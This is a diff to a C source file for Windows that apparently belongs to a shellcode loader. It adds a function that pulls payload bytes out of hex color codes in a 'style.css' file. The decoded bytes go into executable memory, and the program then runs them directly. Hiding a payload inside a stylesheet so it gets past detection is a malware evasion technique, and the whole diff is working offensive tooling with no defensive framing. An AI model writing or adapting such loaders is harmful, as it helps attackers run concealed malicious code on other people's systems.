@@ -45,6 +45,37 @@ BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPaylo
     return TRUE;
 }
 
+BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
+    BYTE * payload = NULL;
+    SIZE_T payloadSize = 0;
+
+    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!payload) {
+        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    while(*cssFile++) {
+        if (strncmp(cssFile, "#", 1) == 0) {
+            BYTE * hexValueStart = cssFile + 1;
+            
+            for (int i = 0; i < 3; i++) {
+                BYTE hexPair[3];
+                hexPair[0] = hexValueStart[i * 2];
+                hexPair[1] = hexValueStart[i * 2 + 1];
+                hexPair[2] = '\0';
+            
+                payload[payloadSize++] = (BYTE) strtol(hexPair, NULL, 16);
+            }
+        }
+    }
+
+    *decPayload = payload;
+    *decPayloadSize = payloadSize;
+
+    return TRUE;
+}
+
 int main(void) {
     HANDLE hFile = NULL;
     BYTE * decodedPayload = NULL;
@@ -54,7 +85,7 @@ int main(void) {
     SIZE_T decodedPayloadSize = 0;
     DWORD oldProt = NULL;
 
-    hFile = CreateFileA("..\\style.css", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    hFile = CreateFileA("..\\..\\style.css", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
         goto _EndOfFunc;
@@ -76,14 +107,18 @@ int main(void) {
         goto _EndOfFunc;
     }
 
-    if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+
+    if (!DecodeCssHex(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
         printf("[!] Error decoding CSS payload\n");
         goto _EndOfFunc;
     }
 
-    // printf("Location of decodedPayload: %p\n", decodedPayload);
-    // printf("Decoded payload size: %d\n", decodedPayloadSize);
-    // getchar();
+
+    // Uncomment and comment above to use Hex version
+    // if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+    //     printf("[!] Error decoding CSS payload\n");
+    //     goto _EndOfFunc;
+    // }
 
     (*(VOID(*)()) decodedPayload)();
 
